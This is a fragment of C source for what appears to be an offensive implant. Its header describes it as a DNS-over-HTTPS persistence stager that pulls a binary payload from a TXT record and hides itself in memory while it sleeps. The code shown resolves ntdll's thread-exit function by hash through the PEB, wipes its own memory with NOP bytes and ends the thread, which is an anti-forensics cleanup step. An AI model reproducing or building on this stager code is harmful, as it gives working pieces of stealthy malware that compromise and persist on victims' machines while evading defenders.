/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#include "common.h"

D_SEC(C) VOID WINAPI Leave( PVOID Start, ULONG Length )
{
	INSTANCE Ins;

	Ins.nt.Base       = PebGetModule( H_NTDLL );
	Ins.nt.ExitThread = PeGetFuncEat( Ins.nt.Base, H_RTLEXITUSERTHREAD );
	__builtin_memset( Start, '\x90', Length ); Ins.nt.ExitThread( 0 );
};
